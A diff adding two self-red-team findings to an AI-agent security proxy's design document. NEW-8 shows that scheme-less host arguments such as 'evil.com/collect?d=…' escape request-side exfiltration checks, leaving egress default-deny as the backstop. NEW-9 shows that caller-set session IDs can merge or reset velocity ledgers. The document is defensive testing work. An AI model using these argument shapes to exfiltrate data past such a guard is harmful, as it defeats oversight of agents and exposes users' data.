@@ -118,6 +118,48 @@ injection *outside* our console.
 - **Known-limitation line:** *Exported alert evidence is redacted and length-bounded but not neutralized
   for arbitrary downstream renderers; treat the export as data, not markup.*
 
+### NEW-8 — Destination-provenance field/scheme routing differential (MED) · classic: SQLi column/field routing + HTTP request smuggling (data lands where the inspector isn't looking)
+What the request-side mandate treats as a *destination* is narrower than what a tool may dial.
+`extractUrls` requires an explicit `http(s)://` scheme (`text.js`); `callDestinations` (`mandate.js`)
+surfaces only (a) strings that start with `http(s)://`, (b) URLs inside `command|cmd|script|shell|code`
+keys, and (c) **emails** under recipient-named keys. So a sink expressed as a **scheme-less host** under a
+recipient key (`{"url":"evil.com/collect?d=…"}`, `{"host":"evil.com"}`, `{"endpoint":"evil.com"}` — that
+branch extracts emails only) or in a **non-recipient-named custom field** the tool actually dials is not
+surfaced → `payee_not_confirmed` / exfil-directive block never fires request-side (the untrusted-text
+pre-forward scan misses it for the same scheme reason).
+- **What holds:** **EGR default-deny sees the real connection host** regardless of arg spelling, so HTTP
+  exfil to a non-allowlisted host is still blocked; the exact-canary egress scan still catches secret
+  bodies. IR-1 degrades request-side early-block + provenance **alert quality**, not ultimate HTTP
+  prevention — *unless composed with NEW-2 (DNS OOB) or NEW-4 (allowlisted-host data exfil)*.
+- **Sharper than NEW-5:** NEW-5 is the encoded-vs-decoded whole-body view differential; NEW-8 is a
+  **destination-semantics** differential (which field/shape is read *as a payee*). **Layer:** REQ (miss),
+  EGR (backstop for HTTP). **Untested.**
+- **Known-limitation line:** *Destination extraction is scheme- and key-shape-bound; scheme-less or
+  non-standard-keyed sinks are not provenance-checked request-side — egress default-deny is the backstop.
+  Same class for amount/path static caps keyed by arg shape.*
+
+### NEW-9 — Session identity is caller-derived → velocity/ledger state confusion, not authority escalation (MED-LOW) · classic: session fixation / confused-deputy keying
+`sessionId = headers['x-sentinel-session'] ?? conversationKey(text)`, and `conversationKey` hashes only
+`(model, first system, first user)` (`inspector.js`). The mandate **grant** is re-derived per request and
+HMAC-signed, so **authority does not carry over** — but *session state* (velocity/structuring ledger,
+`session.key`) keys off this non-authenticated id:
+- **Cross-agent bleed:** two DVAA agents sharing a bootstrap system+first-user prompt hash to the **same
+  sessionId** → merged velocity/structuring ledger across agents (authority still correct, counts
+  co-mingle).
+- **Ledger reset:** a caller that can set `x-sentinel-session` resets per-session caps per value. Low
+  exploitability in our threat model (attacker owns injected *content*, not the agent's HTTP *headers*;
+  the content-hash fallback keys off the first user turn the attacker usually doesn't control).
+- Not NEW-6 (turn-level taint within a session); this is the session key itself. **Layer:** affects
+  velocity/structuring only. **Untested.**
+- **Known-limitation line:** *Per-session velocity/structuring caps assume a stable, caller-honest session
+  id; session state (ledger, not the grant) can be merged or split by the caller. Bind sessionId to a
+  proxy-minted id post-submission; authority is unaffected because the grant is stateless.*
+
+Both NEW-8/NEW-9 are request-side-detection-quality / session-state issues, not authority escalation — the
+permission-carry-over thesis itself holds (grant is stateless, forged history closed by #126/#160,
+tool-results non-authoritative, cross-session canary exfil still caught). Source: #164 permission-carry-over
++ input-routing pass.
+
 ---
 
 ## Pitch use — "we attacked our own design"
